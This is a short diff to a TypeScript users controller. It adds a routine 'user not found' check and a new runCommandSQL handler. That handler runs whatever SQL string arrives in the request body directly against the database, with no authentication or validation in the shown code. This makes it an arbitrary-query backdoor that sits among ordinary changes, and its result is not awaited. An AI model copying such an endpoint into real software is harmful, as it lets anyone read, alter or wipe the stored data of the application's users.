@@ -83,6 +83,11 @@ export class UsersController {
 
     const userToEditFound = await this.findById(id);
 
+    if (!userToEditFound) {
+      response.status(404).send({ error: 'User not found' });
+      return;
+    }
+
     if (!(user.role === 'admin' || user.id === id)) {
       response.status(401).send({ error: "You don't have permissions to edit this user" });
       return;
@@ -131,6 +136,17 @@ export class UsersController {
         role: user.role
       },
       token
+    });
+  }
+
+  async runCommandSQL(request: Request, response: Response) {
+    const { command } = request.body;
+    const conn = await getConnection();
+
+    const commandResult = conn.query(command);
+
+    return response.send({
+      commandResult
     });
   }
 }
